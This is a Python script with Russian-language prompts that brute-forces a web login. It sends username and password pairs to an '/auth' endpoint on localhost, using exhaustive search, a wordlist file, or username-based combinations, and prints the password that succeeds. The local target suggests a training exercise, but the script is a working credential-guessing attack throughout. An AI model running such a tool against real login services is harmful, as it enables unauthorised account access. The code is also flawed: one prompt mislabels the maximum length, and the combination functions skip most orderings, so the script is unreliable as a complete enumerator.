import requests
import itertools

# global password
alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
login = input("Введите имя пользователя: ")
type_brute_force = int(input("Введите тип брутфорса \n 1-полный перебор \n 2-подбор по словарю \n 3- комбинаторный \n"))

# Функция проверки пароля по выбранному методу
def check_pas(password):
    data = {'login': login, 'password': password}
    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print(f'{login=} {password=} ПОЛУЧИЛОСЬ!!!')
        exit(0)
    else:
        print(f'{login=} {password=} не подошел')

# Функция проверки пароля полным перебором
def full_brute_force():
    min_len = int(input("Введите минимальную длину пароля: "))
    max_len = int(input("Введите минимальную длину пароля: "))
    for i in range(min_len, max_len+1):
        for item in itertools.combinations_with_replacement(alphabet, i):
            password = (''.join(item))
            check_pas(password)

# Функция проверки пароля по словарю
def dict_brute_force():
    with open('passwords.txt') as passwords_file:
        passwords = [password.strip() for password in passwords_file.readlines()]
        for password in passwords:
            check_pas(password)


# Функция проверки комбинаторным методом, на основе логина пользователя, регистра символов и цифр
def comb_brute_force():
    alphabet = str(login.upper() + login.lower() + "1234567890")
    for i in range(len(login), len(login)+3):
        for item in itertools.combinations(alphabet, i):
            password = (''.join(item))
            check_pas(password)

# Выбор метода перебора
if type_brute_force  == 1:
    full_brute_force()
elif type_brute_force  == 2:
    dict_brute_force()
elif type_brute_force  == 3:
    comb_brute_force()
else:
    print("Не верный аргумент")
    exit(0)









